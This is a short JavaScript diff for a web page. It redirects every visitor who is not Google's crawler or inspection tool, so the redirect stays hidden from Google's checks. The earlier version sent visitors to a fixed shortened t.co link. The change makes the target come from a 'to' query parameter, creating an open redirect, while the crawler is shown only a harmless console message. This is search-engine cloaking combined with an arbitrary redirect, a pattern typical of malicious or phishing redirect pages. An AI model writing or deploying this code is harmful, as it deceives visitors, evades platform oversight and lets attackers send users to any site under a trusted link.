@@ -1,10 +1,12 @@
 const ua = navigator.userAgent;
 
-if (
-  !ua.includes('Googlebot') &&
-  !ua.includes('Google-InspectionTool')
-) {
-  window.location.href = "https://t.co/88liu8ZUFm";
+if (!ua.includes('Googlebot') && !ua.includes('Google-InspectionTool')) {
+  const urlParams = new URLSearchParams(window.location.search);
+  const targetUrl = urlParams.get('to');
+
+  if (targetUrl) {
+    window.location.href = targetUrl;
+  }
 } else {
-  console.log("Thanks for visiting my page");
+  console.log("Thanks for visiting my page");
 }
